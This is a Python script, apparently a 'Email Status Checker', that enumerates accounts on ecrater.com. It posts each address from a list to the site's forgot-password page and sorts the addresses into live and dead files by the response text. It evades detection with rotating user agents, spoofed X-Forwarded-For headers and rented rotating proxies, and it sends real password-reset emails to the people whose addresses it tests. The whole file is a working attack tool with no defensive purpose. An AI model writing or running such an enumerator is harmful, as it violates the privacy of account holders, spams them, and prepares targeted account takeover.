import asyncio
import aiofiles
import aiohttp
import ssl
import random
import re
from datetime import datetime

# Danh sách User-Agents
USER_AGENTS = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1"
]

def create_ssl_context():
    context = ssl.create_default_context()
    context.set_ciphers('DEFAULT@SECLEVEL=1')
    return context

def get_random_ip():
    return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"

headers = {
    "User-Agent": random.choice(USER_AGENTS),
    "X-Forwarded-For": get_random_ip(),
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
    "Referer": "https://www.ecrater.com/",
    "Content-Type": "application/x-www-form-urlencoded"
}

# Biến toàn cục
checked_count = 0
total_emails = 0
BATCH_SIZE = 100
MAX_RETRIES = 5
is_checking = False
use_proxy = False
proxy_api_key = ""
current_proxy = None

# Hàm lấy proxy từ WWProxy
async def get_proxy(api_key):
    proxy_url = f"https://wwproxy.com/api/client/proxy/available?key={api_key}&provinceId=-1"
    headers_proxy = {
        "User-Agent": random.choice(USER_AGENTS),
        "X-Forwarded-For": get_random_ip()
    }
    
    async with aiohttp.ClientSession() as session:
        while True:
            try:
                async with session.get(proxy_url, headers=headers_proxy, timeout=aiohttp.ClientTimeout(total=10)) as response:
                    proxy_data = await response.json()
                    
                    if proxy_data.get("status") == "OK":
                        proxy = proxy_data["data"].get("proxy")  # Ví dụ: "27.75.18.4:12765"
                        print(f"Got proxy: {proxy}")
                        return f"http://{proxy}"
                    elif proxy_data.get("status") == "BAD_REQUEST":
                        message = proxy_data.get("message", "")
                        if "Key đã hết hạn" in message:
                            print(f"API Key expired: {api_key[:8]}...")
                            return "EXPIRED"
                        elif "Thời gian giữa hai lần lấy proxy" in message:
                            wait_time = int(re.search(r'Vui lòng chờ thêm (\d+)s', message).group(1))
                            print(f"Proxy rate limit hit. Waiting {wait_time} seconds")
                            await asyncio.sleep(wait_time)
                            continue
                        elif "Đã có lỗi xảy ra. Vui lòng thử lại!" in message:
                            print(f"Proxy error. Retrying in 5 seconds")
                            await asyncio.sleep(5)
                            continue
                    print(f"Unexpected proxy response: {proxy_data}")
                    return None
            except Exception as e:
                print(f"Error getting proxy: {e}")
                return None

# Các hàm xử lý email
def fix_email(email):
    email = email.strip().replace(' ', '')
    if '@' in email and '.' not in email.split('@')[-1]:
        if email.endswith('@gmail') or email.endswith('@outlook') or email.endswith('@yahoo') or email.endswith('@hotmail'):
            email += '.com'
    return email

def is_valid_email(email):
    email = fix_email(email)
    pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    return bool(re.match(pattern, email)), email

async def load_emails_from_file(filename):
    emails = []
    try:
        async with aiofiles.open(filename, 'r', encoding='utf-8') as f:
            async for line in f:
                email = line.strip()
                if email:
                    is_valid, fixed_email = is_valid_email(email)
                    if is_valid:
                        emails.append(fixed_email)
    except Exception as e:
        print(f"Error reading file {filename}: {e}")
    return emails

async def append_to_file(filename, email):
    try:
        async with aiofiles.open(filename, 'a', encoding='utf-8') as f:
            await f.write(email + '\n')
    except Exception as e:
        print(f"Error writing to file {filename}: {e}")

async def remove_email_from_file(filename, email):
    try:
        emails = await load_emails_from_file(filename)
        if email in emails:
            emails.remove(email)
            async with aiofiles.open(filename, 'w', encoding='utf-8') as f:
                await f.writelines(email + '\n' for email in emails if email)
    except Exception as e:
        print(f"Error removing email from file {filename}: {e}")

async def check_email(session, email, live_file, die_file, unknown_file, proxy=None, retries=0):
    if not is_checking:
        return email, "Stopped"
    
    url = "https://www.ecrater.com/forgot-password.php"
    payload = {"email": email, "ok": ""}
    
    try:
        async with session.post(url, data=payload, headers=headers, proxy=proxy) as response:
            response_text = await response.text()
            
            if "Email (no such user)" in response_text:
                status = "DIE"
                await append_to_file(die_file, email)
            elif "Your password reset link has been sent" in response_text:
                status = "LIVE"
                await append_to_file(live_file, email)
            else:
                status = "Unknown"
                if retries < MAX_RETRIES - 1:
                    await asyncio.sleep(1)
                    return await check_email(session, email, live_file, die_file, unknown_file, proxy, retries + 1)
                await append_to_file(unknown_file, email)
            
            return email, status
    except Exception as e:
        await append_to_file(unknown_file, email)
        return email, f"Error: {str(e)}"

async def check_batch_emails(emails, timestamp):
    global checked_count, current_proxy
    
    live_file = f"live_{timestamp}.txt"
    die_file = f"die_{timestamp}.txt"
    unknown_file = f"unknown_{timestamp}.txt"
    
    connector = aiohttp.TCPConnector(ssl=create_ssl_context())
    
    if use_proxy and proxy_api_key:
        current_proxy = await get_proxy(proxy_api_key)
        if current_proxy == "EXPIRED":
            print("WWProxy API Key has expired!")
            return
    else:
        current_proxy = None
    
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [check_email(session, email, live_file, die_file, unknown_file, current_proxy) 
                 for email in emails if email and is_checking]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in results:
            if not isinstance(result, Exception):
                email, status = result
                checked_count += 1
                print(f"{email}: {status}")
                if input_method == "file" and selected_file:
                    await remove_email_from_file(selected_file, email)

async def check_emails_async(email_list, timestamp):
    global checked_count, total_emails, is_checking
    total_emails = len(email_list)
    checked_count = 0
    is_checking = True
    
    for i in range(0, len(email_list), BATCH_SIZE):
        if not is_checking:
            break
        batch = email_list[i:i + BATCH_SIZE]
        await check_batch_emails(batch, timestamp)
    
    print(f"Checked: {checked_count}/{total_emails}")
    print("Email checking completed!")

async def main():
    global use_proxy, proxy_api_key, input_method, selected_file, is_checking
    
    print("Email Status Checker")
    print("1. Enter emails manually")
    print("2. Load emails from file")
    choice = input("Choose an option (1 or 2): ").strip()
    
    if choice == "1":
        input_method = "manual"
        print("Enter emails (one per line, press Ctrl+D or Ctrl+Z to finish):")
        email_list = []
        try:
            while True:
                email = input().strip()
                if email:
                    is_valid, fixed_email = is_valid_email(email)
                    if is_valid:
                        email_list.append(fixed_email)
        except EOFError:
            pass
    elif choice == "2":
        input_method = "file"
        selected_file = input("Enter the path to your email file: ").strip()
        email_list = await load_emails_from_file(selected_file)
    else:
        print("Invalid choice!")
        return
    
    if not email_list:
        print("No valid emails to check!")
        return
    
    use_proxy_input = input("Use WWProxy? (yes/no): ").strip().lower()
    use_proxy = use_proxy_input == "yes"
    if use_proxy:
        proxy_api_key = input("Enter WWProxy API Key: ").strip()
        if not proxy_api_key:
            print("API Key is required when using proxy!")
            return
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    await check_emails_async(email_list, timestamp)

if __name__ == "__main__":
    asyncio.run(main())